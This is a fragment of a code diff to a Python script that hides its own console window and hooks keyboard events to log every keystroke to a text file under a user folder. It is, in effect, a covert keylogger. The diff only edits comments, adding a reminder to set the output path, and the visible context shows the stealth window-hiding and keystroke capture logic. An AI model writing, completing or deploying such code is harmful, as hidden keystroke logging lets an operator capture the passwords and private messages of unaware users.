@@ -10,6 +10,7 @@ win = win32console.GetConsoleWindow()
 win32gui.ShowWindow(win, 0)
 
 # Customizable Script
+# Be sure to change desired path for output text file
 def on_keyboard_event(e):
     if e.event_type == keyboard.KEY_DOWN:
         if e.name == 'space':
@@ -20,7 +21,7 @@ def on_keyboard_event(e):
             # Simulate a backspace by removing the last character in the file
             with open('C:\\Users\\loaner\\output.txt', 'r') as f:
                 content = f.read()
-            # Desired path for output text file
+        
             with open('C:\\Users\\loaner\\output.txt', 'w') as f:
                 f.write(content[:-1])
                 
